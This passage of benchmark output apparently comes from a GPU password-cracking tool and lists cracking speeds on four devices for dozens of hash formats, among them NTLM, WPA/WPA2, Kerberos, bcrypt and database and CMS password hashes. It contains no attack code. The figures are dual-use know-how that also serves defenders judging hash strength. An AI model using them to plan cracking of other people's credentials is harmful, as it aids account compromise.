(210.28ms)\nSpeed.Dev.#4.....: 70143.4 kH/s (206.80ms)\nSpeed.Dev.#*.....:   281.3 MH/s\n\nHashtype: GOST R 34.11-2012 (Streebog) 512-bit\n\nSpeed.Dev.#1.....: 70886.4 kH/s (204.63ms)\nSpeed.Dev.#2.....: 71401.3 kH/s (203.14ms)\nSpeed.Dev.#3.....: 69004.4 kH/s (210.21ms)\nSpeed.Dev.#4.....: 70166.4 kH/s (206.74ms)\nSpeed.Dev.#*.....:   281.5 MH/s\n\nHashtype: DES (PT = $salt, key = $pass)\n\nSpeed.Dev.#1.....: 24712.9 MH/s (75.97ms)\nSpeed.Dev.#2.....: 25001.0 MH/s (75.08ms)\nSpeed.Dev.#3.....: 24080.5 MH/s (77.97ms)\nSpeed.Dev.#4.....: 24404.5 MH/s (76.92ms)\nSpeed.Dev.#*.....: 98198.9 MH/s\n\nHashtype: 3DES (PT = $salt, key = $pass)\n\nSpeed.Dev.#1.....:   772.5 MH/s (75.96ms)\nSpeed.Dev.#2.....:   780.4 MH/s (75.21ms)\nSpeed.Dev.#3.....:   753.5 MH/s (77.90ms)\nSpeed.Dev.#4.....:   764.1 MH/s (76.82ms)\nSpeed.Dev.#*.....:  3070.5 MH/s\n\nHashtype: phpass, WordPress (MD5), phpBB3 (MD5), Joomla (MD5)\n\nSpeed.Dev.#1.....:  9830.5 kH/s (91.84ms)\nSpeed.Dev.#2.....:  9794.5 kH/s (92.16ms)\nSpeed.Dev.#3.....:  9597.1 kH/s (94.09ms)\nSpeed.Dev.#4.....:  9687.9 kH/s (93.21ms)\nSpeed.Dev.#*.....: 38910.1 kH/s\n\nHashtype: scrypt\n\nSpeed.Dev.#1.....:   909.6 kH/s (15.51ms)\nSpeed.Dev.#2.....:   907.6 kH/s (15.53ms)\nSpeed.Dev.#3.....:   892.7 kH/s (15.75ms)\nSpeed.Dev.#4.....:   896.1 kH/s (15.67ms)\nSpeed.Dev.#*.....:  3605.9 kH/s\n\nHashtype: PBKDF2-HMAC-MD5\n\nSpeed.Dev.#1.....: 10267.8 kH/s (57.47ms)\nSpeed.Dev.#2.....: 10310.5 kH/s (57.22ms)\nSpeed.Dev.#3.....: 10032.0 kH/s (58.80ms)\nSpeed.Dev.#4.....: 10140.0 kH/s (58.22ms)\nSpeed.Dev.#*.....: 40750.3 kH/s\n\nHashtype: PBKDF2-HMAC-SHA1\n\nSpeed.Dev.#1.....:  4650.9 kH/s (96.95ms)\nSpeed.Dev.#2.....:  4611.4 kH/s (97.76ms)\nSpeed.Dev.#3.....:  4389.8 kH/s (42.80ms)\nSpeed.Dev.#4.....:  4428.1 kH/s (84.94ms)\nSpeed.Dev.#*.....: 18080.3 kH/s\n\nHashtype: PBKDF2-HMAC-SHA256\n\nSpeed.Dev.#1.....:  1683.0 kH/s (58.89ms)\nSpeed.Dev.#2.....:  1695.7 kH/s (58.22ms)\nSpeed.Dev.#3.....:  1638.8 kH/s (60.26ms)\nSpeed.Dev.#4.....:  1660.4 kH/s (59.39ms)\nSpeed.Dev.#*.....:  6678.0 kH/s\n\nHashtype: PBKDF2-HMAC-SHA512\n\nSpeed.Dev.#1.....:   614.4 kH/s (85.15ms)\nSpeed.Dev.#2.....:   622.8 kH/s (84.01ms)\nSpeed.Dev.#3.....:   601.3 kH/s (87.01ms)\nSpeed.Dev.#4.....:   609.5 kH/s (85.84ms)\nSpeed.Dev.#*.....:  2448.0 kH/s\n\nHashtype: Skype\n\nSpeed.Dev.#1.....: 18036.6 MH/s (52.04ms)\nSpeed.Dev.#2.....: 18310.0 MH/s (51.27ms)\nSpeed.Dev.#3.....: 17703.5 MH/s (53.05ms)\nSpeed.Dev.#4.....: 17931.6 MH/s (52.37ms)\nSpeed.Dev.#*.....: 71981.6 MH/s\n\nHashtype: WPA/WPA2\n\nSpeed.Dev.#1.....:   576.5 kH/s (49.54ms)\nSpeed.Dev.#2.....:   571.1 kH/s (50.02ms)\nSpeed.Dev.#3.....:   566.5 kH/s (50.43ms)\nSpeed.Dev.#4.....:   563.7 kH/s (50.67ms)\nSpeed.Dev.#*.....:  2277.9 kH/s\n\nHashtype: IKE-PSK MD5\n\nSpeed.Dev.#1.....:  2458.0 MH/s (95.13ms)\nSpeed.Dev.#2.....:  2469.0 MH/s (94.70ms)\nSpeed.Dev.#3.....:  2394.9 MH/s (48.97ms)\nSpeed.Dev.#4.....:  2444.3 MH/s (95.69ms)\nSpeed.Dev.#*.....:  9766.2 MH/s\n\nHashtype: IKE-PSK SHA1\n\nSpeed.Dev.#1.....:  1006.3 MH/s (58.24ms)\nSpeed.Dev.#2.....:  1013.1 MH/s (57.88ms)\nSpeed.Dev.#3.....:   986.8 MH/s (59.42ms)\nSpeed.Dev.#4.....:   996.9 MH/s (58.82ms)\nSpeed.Dev.#*.....:  4003.2 MH/s\n\nHashtype: NetNTLMv1 / NetNTLMv1+ESS\n\nSpeed.Dev.#1.....: 30360.6 MH/s (61.86ms)\nSpeed.Dev.#2.....: 30506.0 MH/s (61.57ms)\nSpeed.Dev.#3.....: 29605.8 MH/s (63.42ms)\nSpeed.Dev.#4.....: 30205.9 MH/s (62.18ms)\nSpeed.Dev.#*.....:   120.7 GH/s\n\nHashtype: NetNTLMv2\n\nSpeed.Dev.#1.....:  2278.0 MH/s (51.53ms)\nSpeed.Dev.#2.....:  2286.5 MH/s (51.34ms)\nSpeed.Dev.#3.....:  2222.0 MH/s (52.82ms)\nSpeed.Dev.#4.....:  2264.1 MH/s (51.82ms)\nSpeed.Dev.#*.....:  9050.6 MH/s\n\nHashtype: IPMI2 RAKP HMAC-SHA1\n\nSpeed.Dev.#1.....:  2330.0 MH/s (50.35ms)\nSpeed.Dev.#2.....:  2342.9 MH/s (50.10ms)\nSpeed.Dev.#3.....:  2283.5 MH/s (51.38ms)\nSpeed.Dev.#4.....:  2311.2 MH/s (50.79ms)\nSpeed.Dev.#*.....:  9267.6 MH/s\n\nHashtype: Kerberos 5 AS-REQ Pre-Auth etype 23\n\nSpeed.Dev.#1.....:   405.1 MH/s (72.45ms)\nSpeed.Dev.#2.....:   407.3 MH/s (72.01ms)\nSpeed.Dev.#3.....:   396.6 MH/s (73.97ms)\nSpeed.Dev.#4.....:   402.5 MH/s (72.91ms)\nSpeed.Dev.#*.....:  1611.5 MH/s\n\nHashtype: Kerberos 5 TGS-REP etype 23\n\nSpeed.Dev.#1.....:   406.2 MH/s (72.26ms)\nSpeed.Dev.#2.....:   409.2 MH/s (71.72ms)\nSpeed.Dev.#3.....:   395.6 MH/s (74.18ms)\nSpeed.Dev.#4.....:   401.4 MH/s (73.12ms)\nSpeed.Dev.#*.....:  1612.4 MH/s\n\nHashtype: DNSSEC (NSEC3)\n\nSpeed.Dev.#1.....:  4750.5 MH/s (49.22ms)\nSpeed.Dev.#2.....:  4790.6 MH/s (48.81ms)\nSpeed.Dev.#3.....:  4637.8 MH/s (50.42ms)\nSpeed.Dev.#4.....:  4688.6 MH/s (49.87ms)\nSpeed.Dev.#*.....: 18867.6 MH/s\n\nHashtype: PostgreSQL CRAM (MD5)\n\nSpeed.Dev.#1.....:  8287.2 MH/s (56.66ms)\nSpeed.Dev.#2.....:  8351.5 MH/s (56.22ms)\nSpeed.Dev.#3.....:  8067.2 MH/s (58.20ms)\nSpeed.Dev.#4.....:  8202.2 MH/s (57.25ms)\nSpeed.Dev.#*.....: 32908.1 MH/s\n\nHashtype: MySQL CRAM (SHA1)\n\nSpeed.Dev.#1.....:  3271.1 MH/s (71.50ms)\nSpeed.Dev.#2.....:  3282.9 MH/s (71.24ms)\nSpeed.Dev.#3.....:  3201.2 MH/s (73.04ms)\nSpeed.Dev.#4.....:  3221.6 MH/s (72.60ms)\nSpeed.Dev.#*.....: 12976.8 MH/s\n\nHashtype: SIP digest authentication (MD5)\n\nSpeed.Dev.#1.....:  2783.5 MH/s (84.00ms)\nSpeed.Dev.#2.....:  2812.5 MH/s (83.14ms)\nSpeed.Dev.#3.....:  2711.0 MH/s (86.27ms)\nSpeed.Dev.#4.....:  2747.1 MH/s (85.14ms)\nSpeed.Dev.#*.....: 11054.0 MH/s\n\nHashtype: SMF (Simple Machines Forum) > v1.1\n\nSpeed.Dev.#1.....:  9627.8 MH/s (48.77ms)\nSpeed.Dev.#2.....:  9713.9 MH/s (48.33ms)\nSpeed.Dev.#3.....:  9406.7 MH/s (49.88ms)\nSpeed.Dev.#4.....:  9518.6 MH/s (49.28ms)\nSpeed.Dev.#*.....: 38267.0 MH/s\n\nHashtype: vBulletin < v3.8.5\n\nSpeed.Dev.#1.....:  9726.5 MH/s (48.26ms)\nSpeed.Dev.#2.....:  9820.1 MH/s (95.65ms)\nSpeed.Dev.#3.....:  9494.4 MH/s (49.45ms)\nSpeed.Dev.#4.....:  9593.0 MH/s (48.94ms)\nSpeed.Dev.#*.....: 38634.0 MH/s\n\nHashtype: vBulletin >= v3.8.5\n\nSpeed.Dev.#1.....:  6772.1 MH/s (69.34ms)\nSpeed.Dev.#2.....:  6842.0 MH/s (68.61ms)\nSpeed.Dev.#3.....:  6614.2 MH/s (71.00ms)\nSpeed.Dev.#4.....:  6698.2 MH/s (70.11ms)\nSpeed.Dev.#*.....: 26926.5 MH/s\n\nHashtype: IPB2+ (Invision Power Board), MyBB 1.2+\n\nSpeed.Dev.#1.....:  7010.5 MH/s (66.98ms)\nSpeed.Dev.#2.....:  7078.7 MH/s (66.31ms)\nSpeed.Dev.#3.....:  6856.7 MH/s (68.49ms)\nSpeed.Dev.#4.....:  6942.1 MH/s (67.64ms)\nSpeed.Dev.#*.....: 27888.0 MH/s\n\nHashtype: WBB3 (Woltlab Burning Board)\n\nSpeed.Dev.#1.....:  1807.0 MH/s (64.93ms)\nSpeed.Dev.#2.....:  1815.3 MH/s (64.65ms)\nSpeed.Dev.#3.....:  1765.7 MH/s (66.49ms)\nSpeed.Dev.#4.....:  1782.5 MH/s (65.86ms)\nSpeed.Dev.#*.....:  7170.6 MH/s\n\nHashtype: OpenCart\n\nSpeed.Dev.#1.....:  2908.8 MH/s (80.38ms)\nSpeed.Dev.#2.....:  2911.6 MH/s (80.33ms)\nSpeed.Dev.#3.....:  2835.7 MH/s (82.48ms)\nSpeed.Dev.#4.....:  2863.1 MH/s (81.69ms)\nSpeed.Dev.#*.....: 11519.1 MH/s\n\nHashtype: Joomla < 2.5.18\n\nSpeed.Dev.#1.....: 30788.9 MH/s (61.00ms)\nSpeed.Dev.#2.....: 31062.8 MH/s (60.44ms)\nSpeed.Dev.#3.....: 30092.7 MH/s (62.42ms)\nSpeed.Dev.#4.....: 30438.3 MH/s (61.70ms)\nSpeed.Dev.#*.....:   122.4 GH/s\n\nHashtype: PHPS\n\nSpeed.Dev.#1.....:  9689.0 MH/s (48.43ms)\nSpeed.Dev.#2.....:  9784.2 MH/s (95.98ms)\nSpeed.Dev.#3.....:  9491.3 MH/s (49.46ms)\nSpeed.Dev.#4.....:  9580.1 MH/s (49.01ms)\nSpeed.Dev.#*.....: 38544.6 MH/s\n\nHashtype: Drupal7\n\nSpeed.Dev.#1.....:    80204 H/s (89.18ms)\nSpeed.Dev.#2.....:    80375 H/s (89.00ms)\nSpeed.Dev.#3.....:    78338 H/s (91.31ms)\nSpeed.Dev.#4.....:    79178 H/s (90.34ms)\nSpeed.Dev.#*.....:   318.1 kH/s\n\nHashtype: osCommerce, xt:Commerce\n\nSpeed.Dev.#1.....: 17972.4 MH/s (52.25ms)\nSpeed.Dev.#2.....: 18135.8 MH/s (51.78ms)\nSpeed.Dev.#3.....: 17571.1 MH/s (53.42ms)\nSpeed.Dev.#4.....: 17918.2 MH/s (52.41ms)\nSpeed.Dev.#*.....: 71597.4 MH/s\n\nHashtype: PrestaShop\n\nSpeed.Dev.#1.....: 11914.1 MH/s (78.83ms)\nSpeed.Dev.#2.....: 11947.2 MH/s (78.61ms)\nSpeed.Dev.#3.....: 11662.3 MH/s (80.53ms)\nSpeed.Dev.#4.....: 11750.4 MH/s (79.93ms)\nSpeed.Dev.#*.....: 47273.9 MH/s\n\nHashtype: Django (SHA-1)\n\nSpeed.Dev.#1.....:  9588.7 MH/s (48.96ms)\nSpeed.Dev.#2.....:  9632.4 MH/s (48.74ms)\nSpeed.Dev.#3.....:  9367.3 MH/s (50.09ms)\nSpeed.Dev.#4.....:  9499.9 MH/s (49.38ms)\nSpeed.Dev.#*.....: 38088.4 MH/s\n\nHashtype: Django (PBKDF2-SHA256)\n\nSpeed.Dev.#1.....:    84374 H/s (69.42ms)\nSpeed.Dev.#2.....:    84845 H/s (69.05ms)\nSpeed.Dev.#3.....:    81965 H/s (71.45ms)\nSpeed.Dev.#4.....:    80357 H/s (72.89ms)\nSpeed.Dev.#*.....:   331.5 kH/s\n\nHashtype: MediaWiki B type\n\nSpeed.Dev.#1.....:  8668.0 MH/s (54.14ms)\nSpeed.Dev.#2.....:  8968.7 MH/s (52.33ms)\nSpeed.Dev.#3.....:  8721.3 MH/s (53.84ms)\nSpeed.Dev.#4.....:  8868.8 MH/s (52.94ms)\nSpeed.Dev.#*.....: 35226.7 MH/s\n\nHashtype: Redmine\n\nSpeed.Dev.#1.....:  3859.3 MH/s (60.57ms)\nSpeed.Dev.#2.....:  3886.6 MH/s (60.17ms)\nSpeed.Dev.#3.....:  3778.8 MH/s (61.89ms)\nSpeed.Dev.#4.....:  3836.5 MH/s (60.96ms)\nSpeed.Dev.#*.....: 15361.1 MH/s\n\nHashtype: PunBB\n\nSpeed.Dev.#1.....:  3862.5 MH/s (60.55ms)\nSpeed.Dev.#2.....:  3886.1 MH/s (60.18ms)\nSpeed.Dev.#3.....:  3778.8 MH/s (61.89ms)\nSpeed.Dev.#4.....:  3836.5 MH/s (60.96ms)\nSpeed.Dev.#*.....: 15363.9 MH/s\n\nHashtype: PostgreSQL\n\nSpeed.Dev.#1.....: 30687.9 MH/s (61.20ms)\nSpeed.Dev.#2.....: 30826.3 MH/s (60.93ms)\nSpeed.Dev.#3.....: 29954.5 MH/s (62.68ms)\nSpeed.Dev.#4.....: 30409.2 MH/s (61.77ms)\nSpeed.Dev.#*.....:   121.9 GH/s\n\nHashtype: MSSQL (2000)\n\nSpeed.Dev.#1.....: 11647.8 MH/s (80.62ms)\nSpeed.Dev.#2.....: 11696.4 MH/s (80.29ms)\nSpeed.Dev.#3.....: 11363.7 MH/s (82.65ms)\nSpeed.Dev.#4.....: 11563.2 MH/s (81.22ms)\nSpeed.Dev.#*.....: 46271.1 MH/s\n\nHashtype: MSSQL (2005)\n\nSpeed.Dev.#1.....: 11648.0 MH/s (80.63ms)\nSpeed.Dev.#2.....: 11686.6 MH/s (80.33ms)\nSpeed.Dev.#3.....: 11357.7 MH/s (82.66ms)\nSpeed.Dev.#4.....: 11576.9 MH/s (81.13ms)\nSpeed.Dev.#*.....: 46269.3 MH/s\n\nHashtype: MSSQL (2012, 2014)\n\nSpeed.Dev.#1.....:  1418.2 MH/s (82.76ms)\nSpeed.Dev.#2.....:  1426.9 MH/s (82.28ms)\nSpeed.Dev.#3.....:  1387.5 MH/s (84.62ms)\nSpeed.Dev.#4.....:  1408.9 MH/s (83.32ms)\nSpeed.Dev.#*.....:  5641.5 MH/s\n\nHashtype: MySQL323\n\nSpeed.Dev.#1.....: 67200.1 MH/s (55.90ms)\nSpeed.Dev.#2.....: 67681.7 MH/s (55.50ms)\nSpeed.Dev.#3.....: 65658.5 MH/s (57.19ms)\nSpeed.Dev.#4.....: 66789.2 MH/s (56.24ms)\nSpeed.Dev.#*.....:   267.3 GH/s\n\nHashtype: MySQL4.1/MySQL5\n\nSpeed.Dev.#1.....:  5247.1 MH/s (89.50ms)\nSpeed.Dev.#2.....:  5260.5 MH/s (89.25ms)\nSpeed.Dev.#3.....:  5132.7 MH/s (91.50ms)\nSpeed.Dev.#4.....:  5183.7 MH/s (90.59ms)\nSpeed.Dev.#*.....: 20824.0 MH/s\n\nHashtype: Oracle H: Type (Oracle 7+)\n\nSpeed.Dev.#1.....:  1320.0 MH/s (88.90ms)\nSpeed.Dev.#2.....:  1331.9 MH/s (88.13ms)\nSpeed.Dev.#3.....:  1292.3 MH/s (90.85ms)\nSpeed.Dev.#4.....:  1311.7 MH/s (89.51ms)\nSpeed.Dev.#*.....:  5255.9 MH/s\n\nHashtype: Oracle S: Type (Oracle 11+)\n\nSpeed.Dev.#1.....: 11222.5 MH/s (83.69ms)\nSpeed.Dev.#2.....: 11292.1 MH/s (83.18ms)\nSpeed.Dev.#3.....: 10969.7 MH/s (85.62ms)\nSpeed.Dev.#4.....: 11174.8 MH/s (84.05ms)\nSpeed.Dev.#*.....: 44659.1 MH/s\n\nHashtype: Oracle T: Type (Oracle 12+)\n\nSpeed.Dev.#1.....:   150.2 kH/s (95.26ms)\nSpeed.Dev.#2.....:   150.7 kH/s (95.00ms)\nSpeed.Dev.#3.....:   146.0 kH/s (49.01ms)\nSpeed.Dev.#4.....:   146.6 kH/s (48.83ms)\nSpeed.Dev.#*.....:   593.4 kH/s\n\nHashtype: Sybase ASE\n\nSpeed.Dev.#1.....:   364.0 MH/s (80.64ms)\nSpeed.Dev.#2.....:   364.5 MH/s (80.52ms)\nSpeed.Dev.#3.....:   354.2 MH/s (82.86ms)\nSpeed.Dev.#4.....:   358.9 MH/s (81.77ms)\nSpeed.Dev.#*.....:  1441.6 MH/s\n\nHashtype: Episerver 6.x < .NET 4\n\nSpeed.Dev.#1.....:  9627.8 MH/s (48.74ms)\nSpeed.Dev.#2.....:  9642.1 MH/s (48.69ms)\nSpeed.Dev.#3.....:  9392.6 MH/s (49.99ms)\nSpeed.Dev.#4.....:  9523.4 MH/s (49.30ms)\nSpeed.Dev.#*.....: 38186.0 MH/s\n\nHashtype: Episerver 6.x >= .NET 4\n\nSpeed.Dev.#1.....:  3896.3 MH/s (60.02ms)\nSpeed.Dev.#2.....:  3884.3 MH/s (60.21ms)\nSpeed.Dev.#3.....:  3785.8 MH/s (61.75ms)\nSpeed.Dev.#4.....:  3846.1 MH/s (60.81ms)\nSpeed.Dev.#*.....: 15412.5 MH/s\n\nHashtype: Apache $apr1$ MD5, md5apr1, MD5 (APR)\n\nSpeed.Dev.#1.....: 14383.9 kH/s (62.40ms)\nSpeed.Dev.#2.....: 14364.7 kH/s (62.47ms)\nSpeed.Dev.#3.....: 13983.6 kH/s (64.15ms)\nSpeed.Dev.#4.....: 14238.6 kH/s (63.01ms)\nSpeed.Dev.#*.....: 56970.7 kH/s\n\nHashtype: ColdFusion 10+\n\nSpeed.Dev.#1.....:  2490.5 MH/s (94.28ms)\nSpeed.Dev.#2.....:  2496.0 MH/s (94.06ms)\nSpeed.Dev.#3.....:  2413.7 MH/s (48.62ms)\nSpeed.Dev.#4.....:  2461.9 MH/s (95.38ms)\nSpeed.Dev.#*.....:  9862.1 MH/s\n\nHashtype: hMailServer\n\nSpeed.Dev.#1.....:  3895.6 MH/s (60.03ms)\nSpeed.Dev.#2.....:  3881.1 MH/s (60.21ms)\nSpeed.Dev.#3.....:  3782.8 MH/s (61.82ms)\nSpeed.Dev.#4.....:  3847.5 MH/s (60.74ms)\nSpeed.Dev.#*.....: 15406.9 MH/s\n\nHashtype: nsldap, SHA-1(Base64), Netscape LDAP SHA\n\nSpeed.Dev.#1.....: 11287.5 MH/s (83.20ms)\nSpeed.Dev.#2.....: 11290.6 MH/s (83.19ms)\nSpeed.Dev.#3.....: 11009.4 MH/s (85.31ms)\nSpeed.Dev.#4.....: 11182.0 MH/s (84.00ms)\nSpeed.Dev.#*.....: 44769.5 MH/s\n\nHashtype: nsldaps, SSHA-1(Base64), Netscape LDAP SSHA\n\nSpeed.Dev.#1.....: 11279.6 MH/s (83.24ms)\nSpeed.Dev.#2.....: 11291.0 MH/s (83.19ms)\nSpeed.Dev.#3.....: 11008.0 MH/s (85.32ms)\nSpeed.Dev.#4.....: 11181.5 MH/s (84.00ms)\nSpeed.Dev.#*.....: 44760.1 MH/s\n\nHashtype: SSHA-256(Base64), LDAP {SSHA256}\n\nSpeed.Dev.#1.....:  4392.7 MH/s (53.23ms)\nSpeed.Dev.#2.....:  4382.8 MH/s (53.35ms)\nSpeed.Dev.#3.....:  4269.3 MH/s (54.77ms)\nSpeed.Dev.#4.....:  4323.6 MH/s (54.08ms)\nSpeed.Dev.#*.....: 17368.4 MH/s\n\nHashtype: SSHA-512(Base64), LDAP {SSHA512}\n\nSpeed.Dev.#1.....:  1495.9 MH/s (78.45ms)\nSpeed.Dev.#2.....:  1500.4 MH/s (78.23ms)\nSpeed.Dev.#3.....:  1462.0 MH/s (80.30ms)\nSpeed.Dev.#4.....:  1478.4 MH/s (79.41ms)\nSpeed.Dev.#*.....:  5936.7 MH/s\n\nHashtype: LM\n\nSpeed.Dev.#1.....: 22856.7 MH/s (82.13ms)\nSpeed.Dev.#2.....: 22090.6 MH/s (85.00ms)\nSpeed.Dev.#3.....: 22261.5 MH/s (84.35ms)\nSpeed.Dev.#4.....: 20372.6 MH/s (92.13ms)\nSpeed.Dev.#*.....: 87581.4 MH/s\n\nHashtype: NTLM\n\nSpeed.Dev.#1.....: 52715.6 MH/s (71.26ms)\nSpeed.Dev.#2.....: 52773.4 MH/s (71.16ms)\nSpeed.Dev.#3.....: 51226.7 MH/s (73.34ms)\nSpeed.Dev.#4.....: 51968.4 MH/s (72.28ms)\nSpeed.Dev.#*.....:   208.7 GH/s\n\nHashtype: Domain Cached Credentials (DCC), MS Cache\n\nSpeed.Dev.#1.....: 15255.7 MH/s (61.56ms)\nSpeed.Dev.#2.....: 15290.7 MH/s (61.38ms)\nSpeed.Dev.#3.....: 14826.5 MH/s (63.31ms)\nSpeed.Dev.#4.....: 15097.1 MH/s (62.20ms)\nSpeed.Dev.#*.....: 60470.1 MH/s\n\nHashtype: Domain Cached Credentials 2 (DCC2), MS Cache 2\n\nSpeed.Dev.#1.....:   467.7 kH/s (47.99ms)\nSpeed.Dev.#2.....:   464.2 kH/s (48.36ms)\nSpeed.Dev.#3.....:   460.2 kH/s (48.78ms)\nSpeed.Dev.#4.....:   456.1 kH/s (49.23ms)\nSpeed.Dev.#*.....:  1848.2 kH/s\n\nHashtype: MS-AzureSync PBKDF2-HMAC-SHA256\n\nSpeed.Dev.#1.....: 14331.7 kH/s (48.68ms)\nSpeed.Dev.#2.....: 14208.2 kH/s (49.03ms)\nSpeed.Dev.#3.....: 14079.8 kH/s (49.75ms)\nSpeed.Dev.#4.....: 14063.3 kH/s (49.79ms)\nSpeed.Dev.#*.....: 56682.9 kH/s\n\nHashtype: descrypt, DES (Unix), Traditional DES\n\nSpeed.Dev.#1.....:  1283.3 MH/s (91.45ms)\nSpeed.Dev.#2.....:  1291.1 MH/s (90.90ms)\nSpeed.Dev.#3.....:  1256.5 MH/s (93.40ms)\nSpeed.Dev.#4.....:  1271.3 MH/s (92.31ms)\nSpeed.Dev.#*.....:  5102.2 MH/s\n\nHashtype: BSDiCrypt, Extended DES\n\nSpeed.Dev.#1.....:  2142.7 kH/s (70.81ms)\nSpeed.Dev.#2.....:  2155.0 kH/s (70.41ms)\nSpeed.Dev.#3.....:  2094.8 kH/s (72.44ms)\nSpeed.Dev.#4.....:  2130.4 kH/s (71.22ms)\nSpeed.Dev.#*.....:  8523.0 kH/s\n\nHashtype: md5crypt, MD5 (Unix), Cisco-IOS $1$ (MD5)\n\nSpeed.Dev.#1.....: 14318.2 kH/s (62.67ms)\nSpeed.Dev.#2.....: 14366.2 kH/s (62.46ms)\nSpeed.Dev.#3.....: 13972.2 kH/s (64.25ms)\nSpeed.Dev.#4.....: 14231.0 kH/s (63.06ms)\nSpeed.Dev.#*.....: 56887.6 kH/s\n\nHashtype: bcrypt $2*$, Blowfish (Unix)\n\nSpeed.Dev.#1.....:    21499 H/s (40.62ms)\nSpeed.Dev.#2.....:    21615 H/s (40.40ms)\nSpeed.Dev.#3.....:    20997 H/s (41.55ms)\nSpeed.Dev.#4.....:    21311 H/s (40.94ms)\nSpeed.Dev.#*.....:    85422 H/s\n\nHashtype: sha256crypt $5$, SHA256 (Unix)\n\nSpeed.Dev.#1.....:   531.1 kH/s (85.57ms)\nSpeed.Dev.#2.....:   531.1 kH/s (85.59ms)\nSpeed.Dev.#3.....:   515.8 kH/s (88.13ms)\nSpeed.Dev.#4.....:   524.0 kH/s (86.74ms)\nSpeed.Dev.#*.....:  2102.1 kH/s\n\nHashtype: sha512crypt $6$, SHA512 (Unix)\n\nSpeed.Dev.#1.....:   214.7 kH/s (53.86ms)\nSpeed.Dev.#2.....:   213.3 kH/s (54.22ms)\nSpeed.Dev.#3.....:   210.2 kH/s (55.02ms)\nSpeed.Dev.#4.....:   204.0 kH/s (56.70ms)\nSpeed.Dev.#*.....:   842.3 kH/s\n\nHashtype: OSX v10.4, OSX v10.5, OSX v10.6\n\nSpeed.Dev.#1.....:  9579.0 MH/s (49.00ms)\nSpeed.Dev.#2.....:  9644.7 MH/s (48.68ms)\nSpeed.Dev.#3.....:  9366.4 MH/s (50.12ms)\nSpeed.Dev.#4.....:  8863.4 MH/s (52.97ms)\nSpeed.Dev.#*.....: 37453.4 MH/s\n\nHashtype: OSX v10.7\n\nSpeed.Dev.#1.....:  1324.6 MH/s (88.63ms)\nSpeed.Dev.#2.....:  1330.1 MH/s (88.27ms)\nSpeed.Dev.#3.....:  1238.0 MH/s (94.81ms)\nSpeed.Dev.#4.....:  1288.5 MH/s (91.03ms)\nSpeed.Dev.#*.....:  5181.2 MH/s\n\nHashtype: OSX v10.8+ (PBKDF2-SHA512)\n\nSpeed.Dev.#1.....:    17526 H/s (95.45ms)\nSpeed.Dev.#2.....:    17566 H/s (95.24ms)\nSpeed.Dev.#3.....:    14254 H/s (58.68ms)\nSpeed.Dev.#4.....:    14226 H/s (58.80ms)\nSpeed.Dev.#*.....:    63571 H/s\n\nHashtype: AIX {smd5}\n\nSpeed.Dev.#1.....: 14214.3 kH/s (63.14ms)\nSpeed.Dev.#2.....: 14280.1 kH/s (62.80ms)\nSpeed.Dev.#3.....: 13898.1 kH/s (64.54ms)\nSpeed.Dev.#4.....: 14075.6 kH/s (63.77ms)\nSpeed.Dev.#*.....: 56468.1 kH/s\n\nHashtype: AIX {ssha1}\n\nSpeed.Dev.#1.....: 61875.4 kH/s (49.93ms)\nSpeed.Dev.#2.....: 61743.2 kH/s (50.05ms)\nSpeed.Dev.#3.....: 60304.1 kH/s (51.12ms)\nSpeed.Dev.#4.....: 61363.8 kH/s (50.27ms)\nSpeed.Dev.#*.....:   245.3 MH/s\n\nHashtype: AIX {ssha256}\n\nSpeed.Dev.#1.....: 24025.2 kH/s (70.21ms)\nSpeed.Dev.#2.....: 23883.9 kH/s (70.66ms)\nSpeed.Dev.#3.....: 23507.9 kH/s (71.77ms)\nSpeed.Dev.#4.....: 21529.3 kH/s (79.01ms)\nSpeed.Dev.#*.....: 92946.3 kH/s\n\nHashtype: AIX {ssha512}\n\nSpeed.Dev.#1.....:  9321.3 kH/s (92.05ms)\nSpeed.Dev.#2.....:  9202.6 kH/s (93.32ms)\nSpeed.Dev.#3.....:  8825.9 kH/s (48.57ms)\nSpeed.Dev.#4.....:  8897.6 kH/s (48.12ms)\nSpeed.Dev.#*.....: 36247.4 kH/s\n\nHashtype: Cisco-PIX MD5\n\nSpeed.Dev.#1.....: 22469.4 MH/s (83.59ms)\nSpeed.Dev.#2.....: 22451.1 MH/s (83.66ms)\nSpeed.Dev.#3.....: 21980.5 MH/s (85.46ms)\nSpeed.Dev.#4.....: 22199.4 MH/s (84.62ms)\nSpeed.Dev.#*.....: 89100.5 MH/s\n\nHashtype: Cisco-ASA MD5\n\nSpeed.Dev.#1.....: 22860.6 MH/s (82.14ms)\nSpeed.Dev.#2.....: 22863.9 MH/s (82.14ms)\nSpeed.Dev.#3.....: 22380.0 MH/s (83.94ms)\nSpeed.Dev.#4.....: 22641.0 MH/s (82.96ms)\nSpeed.Dev.#*.....: 90745.6 MH/s\n\nHashtype: Cisco-IOS type 4 (SHA256)\n\nSpeed.Dev.#1.....:  4368.7 MH/s (53.51ms)\nSpeed.Dev.#2.....:  4350.4 MH/s (53.76ms)\nSpeed.Dev.#3.....:  4249.9 MH/s (55.00ms)\nSpeed.Dev.#4.....:  4318.2 MH/s (54.14ms)\nSpeed.Dev.#*.....: 17287.2 MH/s\n\nHashtype: Cisco-IOS $8$ (PBKDF2-SHA256)\n\nSpeed.Dev.#1.....:    84279 H/s (69.47ms)\nSpeed.Dev.#2.....:    84162 H/s (69.58ms)\nSpeed.Dev.#3.....:    78890 H/s (74.26ms)\nSpeed.Dev.#4.....:    79523 H/s (73.72ms)\nSpeed.Dev.#*.....:   326.9 kH/s\n\nHashtype: Cisco-IOS $9$ (scrypt)\n\nSpeed.Dev.#1.....:    24255 H/s (590.80ms)\nSpeed.Dev.#2.....:    24029 H/s (596.31ms)\nSpeed.Dev.#3.....:    23709 H/s (604.39ms)\nSpeed.Dev.#4.....:    23774 H/s (602.75ms)\nSpeed.Dev.#*.....:    95767 H/s\n\nHashtype: Juniper NetScreen/SSG (ScreenOS)\n\nSpeed.Dev.#1.....: 17648.3 MH/s (53.21ms)\nSpeed.Dev.#2.....: 17677.2 MH/s (53.10ms)\nSpeed.Dev.#3.....: 17285.6 MH/s (54.33ms)\nSpeed.Dev.#4.....: 17469.8 MH/s (53.73ms)\nSpeed.Dev.#*.....: 70080.8 MH/s\n\nHashtype: Juniper IVE\n\nSpeed.Dev.#1.....: 14306.6 kH/s (62.71ms)\nSpeed.Dev.#2.....: 14283.8 kH/s (62.78ms)\nSpeed.Dev.#3.....: 13972.0 kH/s (64.26ms)\nSpeed.Dev.#4.....: 14152.9 kH/s (63.40ms)\nSpeed.Dev.#*.....: 56715.2 kH/s\n\nHashtype: Samsung Android 